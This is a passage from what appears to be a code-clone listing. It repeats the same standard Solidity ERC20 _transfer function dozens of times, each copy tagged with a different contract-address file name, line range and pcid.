        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x3fb9d6a99375a51fd64641bd6e1fd6dd310b74e4.sol" startline="118" endline="130" pcid="2309">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xe57f93Bc66faffdC06eabEf8dB45e1fF28Bf67d3.sol" startline="111" endline="123" pcid="8310">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x5ad359AaC713929412c9b802175A9f12E5cf9306.sol" startline="108" endline="120" pcid="3462">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xa0EeeaeA46e92b35849f6F3afC9C63478A0967A0.sol" startline="110" endline="122" pcid="5789">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x2E28a09452b865B719676E3629Fd002222D1111A.sol" startline="111" endline="123" pcid="1391">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xb628B6198E2320437e8a9FF1e72A9FF3f1636cf9.sol" startline="114" endline="126" pcid="6634">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x59C507Cb69406B5975e70A3c3993AF74c11EF51d.sol" startline="111" endline="123" pcid="3394">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xeA9E312E409599e3cCd50Ff1A8F9e742D60C463B.sol" startline="110" endline="122" pcid="8538">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x707dAb814AAE29c506EAfc8036b64066FC403444.sol" startline="107" endline="119" pcid="4139">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x0f572144eaCF6e05F6c82b764CD1c722a6b22723.sol" startline="114" endline="126" pcid="409">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x6dA4a2CFACDf730B214Ac74CD0e39CE8a353aC65.sol" startline="106" endline="118" pcid="4037">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xc7C34e07AA5f03f1b231605BfAFaa3A5a35408a0.sol" startline="107" endline="119" pcid="7156">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x5B8048664dB0A24b6372Cab5972baE9F40c6012e.sol" startline="108" endline="120" pcid="3477">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x9074b21AB3452ABC15F7e15B6b7233EBe9Ed731f.sol" startline="435" endline="447" pcid="5288">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xB1426cE1931Bc2f72fF5eEcFf831679B1fe52c3b.sol" startline="106" endline="118" pcid="6522">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xa149cAa78E7BdE7F564162B17fc98D47B70DA95a.sol" startline="108" endline="120" pcid="5836">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x32eC423819A8C80CC7B609C20961371e75E54FA0.sol" startline="111" endline="123" pcid="1587">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x4C3c01Be6fb38419cE6b1F6782d751c5bE6D7751.sol" startline="109" endline="121" pcid="2873">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x75774b445262eE2952CF1a26b5d735Fe648FCE28.sol" startline="111" endline="123" pcid="4338">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x54D5cc9Ff426EFC848796Bd739c95BCF1Cc82447.sol" startline="199" endline="211" pcid="3169">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xfFc50B460871D6dF13CA15F24c29cB646B6606f5.sol" startline="111" endline="123" pcid="9367">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xCDFcbB5be93d37A33C85ffd7828dDDd332823349.sol" startline="107" endline="119" pcid="7317">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xcd8bdb2857ea0948122ccb9b17fc2a6d721b97ae.sol" startline="109" endline="121" pcid="7302">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x8227de806a54ce72c23fab6f175d80d688536d7a.sol" startline="108" endline="120" pcid="4878">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x6a5187F14C2b01BebF7E60A6BCac513D4fc5F144.sol" startline="108" endline="120" pcid="3932">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x19a99e5BBFAE5fcF744b3C866b40e36aD15CF656.sol" startline="111" endline="123" pcid="810">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x6123891860a51956182A48145D34179b97bE0077.sol" startline="109" endline="121" pcid="3718">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x0934865C5546d21B4fD998bd5E1D3a5cD351D961.sol" startline="111" endline="123" pcid="268">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xd77c9d684B9e00b9Fc45F929d3DE8514DEEd0Cff.sol" startline="111" endline="123" pcid="7719">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xccD47BEeEf5E57708853902581289A950E4E9722.sol" startline="109" endline="121" pcid="7286">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xc18250a3Ca19Da5214B0B7A16c788726139d0b00.sol" startline="111" endline="123" pcid="6961">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xCe07F8b4f1964E69cc6d52B7A8C4B07496CC4143.sol" startline="109" endline="121" pcid="7332">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x8fE05D10B3c7aE008165Db5FA6a472c25E666A7F.sol" startline="110" endline="122" pcid="5273">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xd1a932685B4e94E152589C0f264a851812f25724.sol" startline="109" endline="121" pcid="7463">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x0617c6f1b099dff080a44451a3882b42bfa75188.sol" startline="109" endline="121" pcid="181">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xa23e76262e6617dab8caadd452d0f428201267e1.sol" startline="116" endline="128" pcid="5855">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x445e4AEE9f66Fc3c4a68EBD67B2329Ff5ba5EcDc.sol" startline="109" endline="121" pcid="2546">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xe6306Af140F6eefa1d461Ff04a549D51FF4dd16B.sol" startline="107" endline="119" pcid="8325">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xc3269e2917AcF46F7eDF508cf875f8e29313dabF.sol" startline="107" endline="119" pcid="6991">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x1b7B0b213fB6B96fCFB754881175bb4422e39b52.sol" startline="111" endline="123" pcid="880">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x545189e64a542b50e06902bceec0f536c662f46d.sol" startline="108" endline="120" pcid="3154">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xc4763759BDa9657Cfd06a1613Fc828afD74b70Fa.sol" startline="111" endline="123" pcid="7073">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xCf60d61616a64371DF34580AcE2b13401d29C55c.sol" startline="111" endline="123" pcid="7389">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x1dD5Cf1BC9611382979F365097516380cfa35D97.sol" startline="107" endline="119" pcid="932">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xcc87B5c7F81B57BAE653eeb6a51265E305F85c2a.sol" startline="108" endline="120" pcid="7271">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x8f5b2832b8D440cf00B5Ef5a37d12DC9d96F0839.sol" startline="110" endline="122" pcid="5258">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x49D141A0B0190d120039F603F434F51a39f33D6c.sol" startline="109" endline="121" pcid="2791">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x2e146811a317ba5Eb77209C942b186f67a65E801.sol" startline="111" endline="123" pcid="1376">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x442ab95846d23cb78311e8726f307830163a4502.sol" startline="115" endline="127" pcid="2531">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xA2F5f226ab0cC49602dFf5e178AC9bC978869395.sol" startline="107" endline="119" pcid="5870">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xd2944fe55ABB2E7635F040C57d5b7A656d1808A6.sol" startline="111" endline="123" pcid="7546">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x3bcddA8f67A88449e3a6aEA912f860F28DE1A03a.sol" startline="108" endline="120" pcid="2071">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xCBf5E1478f1B77672a2684535D9aE9Fe1A7aBe5e.sol" startline="112" endline="124" pcid="7256">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xC2DF29A6Ee0a3C12446E45Ad1340A30fEF33a6A9.sol" startline="111" endline="123" pcid="6976">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x3D4c18a96cf765104e6d70aAA8B11a26eD0e1b40.sol" startline="727" endline="739" pcid="2220">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x33F474718b13546c5A717Ff1Fbd2d8BcaB6Fdd45.sol" startline="109" endline="121" pcid="1602">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xA319a1815BC15922A0cCaA8A6E2Ff97DAb632239.sol" startline="108" endline="120" pcid="5885">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xc17DC80eF016E918587Ea3ffb55894a8515519C1.sol" startline="108" endline="120" pcid="6946">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x8e828c6761A342fa4204d8827A8b81B35904471B.sol" startline="109" endline="121" pcid="5222">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
